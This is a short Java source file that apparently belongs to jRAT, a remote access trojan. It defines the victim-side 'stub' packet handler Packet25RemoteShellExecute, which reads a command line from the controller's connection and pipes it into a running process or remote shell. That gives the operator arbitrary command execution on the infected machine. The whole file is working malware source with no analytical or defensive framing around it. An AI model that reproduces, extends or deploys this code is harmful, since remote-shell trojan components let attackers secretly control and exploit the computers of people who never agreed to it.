package pro.jrat.stub.packets.incoming;

import java.io.PrintWriter;

import pro.jrat.stub.Connection;
import pro.jrat.stub.LaunchProcess;
import pro.jrat.stub.RemoteShell;



public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String line = Connection.readLine();
		
		if (LaunchProcess.latest != null) {
			PrintWriter input = new PrintWriter(LaunchProcess.latest.p.getOutputStream(), true);
			input.println(line);
		} else if (RemoteShell.p != null) {
			PrintWriter input = new PrintWriter(RemoteShell.p.getOutputStream(), true);
			input.println(line);
		}
	}

}
